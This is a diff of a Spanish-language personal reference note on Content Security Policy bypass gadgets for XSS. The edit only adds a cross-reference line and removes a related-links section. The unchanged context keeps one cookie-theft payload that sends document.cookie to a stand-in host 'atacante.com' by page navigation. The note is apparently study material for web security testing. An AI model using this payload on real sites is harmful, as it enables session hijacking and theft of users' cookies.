@@ -11,6 +11,7 @@ tags:
 
 > [!info] Referencia pura, no un zettel
 > El criterio —cómo leer la política y decidir si tiene hueco— está en [[XSS - CSP]]. Acá los gadgets por tipo de debilidad. `yi``  ` copia.
+> El criterio y la decisión, en [[MOC - Cross-site scripting]]. Ver también: [[XSS impacto - matriz de referencia]].
 
 ## 0. Leer la política primero
 
@@ -67,7 +68,3 @@ Navegación en vez de fetch — a veces `connect-src` no cubre navegación.
 
 `document.location='https://atacante.com/?c='+document.cookie`
 Si `navigation` no está restringida por la política.
-
-## Relacionadas
-
-[[XSS - CSP]] · [[MOC - Cross-site scripting]] · [[XSS impacto - matriz de referencia]]
